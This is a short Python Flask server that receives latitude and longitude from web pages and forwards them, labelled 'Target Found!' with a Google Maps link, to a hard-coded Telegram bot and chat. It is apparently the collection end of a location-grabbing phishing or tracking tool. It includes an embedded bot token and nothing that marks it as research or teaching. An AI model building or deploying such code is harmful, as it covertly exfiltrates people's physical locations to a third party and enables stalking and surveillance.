from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

TOKEN = "8788602350:AAE_L4oTu8ja32Axmr8A1o5jpqJFRqHWkq8"
CHAT_ID = "93372553"

@app.route('/data', methods=['POST'])
def handle_data():
    content = request.json
    lat = content.get('lat')
    lon = content.get('lon')
    
    # Telegram par message bhej raha hai
    msg = f"📍 Target Found!\nLat: {lat}\nLon: {lon}\nMaps: https://www.google.com/maps?q={lat},{lon}"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
    
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run()